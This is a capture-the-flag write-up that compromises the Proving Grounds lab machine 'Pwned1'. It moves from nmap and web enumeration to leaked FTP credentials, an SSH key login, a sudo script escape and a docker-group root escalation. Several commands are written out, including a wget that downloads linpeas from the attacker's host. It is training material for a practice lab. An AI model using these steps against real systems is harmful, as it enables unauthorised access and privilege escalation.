---
description: Pg Practice Pwned1 writeup
---

# Pwned1

![](<../../../.gitbook/assets/image (672).png>)

## Nmap

```
sudo nmap 192.168.218.95 -p- -sS -sC

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
```

## FTP

We have FTP open running vsftpd 3.0.3. As of the time of writing this version does not have any public exploits. I check the anonymous login and we get '530 Permission denied.'

![](<../../../.gitbook/assets/image (674).png>)

## HTTP

We have HTTP open on port 80. I start by running `Feroxbuster` and `nikto` to enumerate directories and scan for vulnerabilities.

![feroxbuster](<../../../.gitbook/assets/image (675).png>)

![Nikto](<../../../.gitbook/assets/image (676) (1).png>)

After a short while `nikto` finishes with the results below.

![](<../../../.gitbook/assets/image (677) (1).png>)

We can take note of the following interesting information:

* /nothing/
* /hidden\_text/
* /robots.txt

Before we look at these we can take a quick look at the root page for http://192.168.218.95

![http://192.168.218.95](<../../../.gitbook/assets/image (678) (1).png>)

The directory /nothing/ contains the following:

![/nothing/](<../../../.gitbook/assets/image (679) (1).png>)

The Directory /hidden\_text/ contains a file secret.dic. We can extract this information and load it into `feroxbuster`.

![/hidden\_text/secret.dic](<../../../.gitbook/assets/image (680).png>)

We get the following results from running the secret.dic file against feroxbuster.

![](<../../../.gitbook/assets/image (681).png>)

the directory /pwned.vuln takes us to the following page:

![http://192.168.218.95/pwned.vuln/](<../../../.gitbook/assets/image (682) (1).png>)

Viewing the page source produces the following information:

![](<../../../.gitbook/assets/image (683) (1).png>)

We have the following credentials:

```
ftpuser:B0ss_Pr!ncesS
```

## FTP

I tried these against the /pwned.vuln page and these credentials are not valid. FTP is a hint due to the username so we can check this next.

![](<../../../.gitbook/assets/image (684).png>)

Once inside FTP we can move into the 'share' directory and download the contents inside.

![](<../../../.gitbook/assets/image (685).png>)

When reading the contents of note.txt we see e have a potential username of 'ariana'.

## SSH

![](<../../../.gitbook/assets/image (686) (1).png>)

The other file we have is a possible SSH key. We can take proper owner of this file with the `chmod` command and then attempt to use this against SSH with the username ariana.

```
chmod 600 id_rsa
```

We can then attempt to use this to login to `SSH` with.

```
ssh -i /home/kali/id_rsa ariana@192.168.218.95
```

![](<../../../.gitbook/assets/image (687).png>)

## Access as user

We now have access as ariana. We can grab the user flag in our current directory before moving onto privilege escalation.

In the directory we have the file 'ariana-personal.diary' which contains the information below:

![](<../../../.gitbook/assets/image (688).png>)

Currently I am not sure how this information could be useful right now as we have already found this directory on the server.

I next upload `linpeas` to get the server using a python server on my attacking machine.

```
wget http://<Attacking-IP>:<port>/linpeas.sh
```

## Privilege Escalation

After running `linpeas.sh` we see the following information that stands out:

![](<../../../.gitbook/assets/image (689) (1).png>)

We can run the following file /home/messenger.sh with sudo without a password requirement as the user selena.

The file messenger.sh is made up of the following:

![](<../../../.gitbook/assets/image (690).png>)

Lets run the file and see what happens.

```
sudo -u selena /home/messenger.sh
```

I tried running a `whoami` command to see if anything interesting would happen and nothing did.

![](<../../../.gitbook/assets/image (692) (1).png>)

We can check [GTFObins ](https://gtfobins.github.io/gtfobins/bash/)to see if we can perform an escape on the script.

![](<../../../.gitbook/assets/image (693).png>)

I run the script again using bash as the value and was then able to perform the `id` command as the user selena.

![](<../../../.gitbook/assets/image (694).png>)

I then upgraded the shell to something a little more usable.

```
/usr/bin/script -qc /bin/bash /dev/null
```

We also have a diary in selene's directory which at this point does not provide any new information.

![](<../../../.gitbook/assets/image (695) (1).png>)

Again we can run `linpeas.sh` to check for any possible privilege escalation routes.

```
wget http://<Attacking-IP>:<port>/linpeas.sh
```

linpeas.sh shows that we are part of the 'docker' group.

![](<../../../.gitbook/assets/image (696).png>)

If we search docker on [GTFObins](https://gtfobins.github.io/gtfobins/bash/) we see we may be able to spawn a root shell.

![](<../../../.gitbook/assets/image (697).png>)

I executed the command above and was able to spawn a root shell.

![](<../../../.gitbook/assets/image (698) (1).png>)
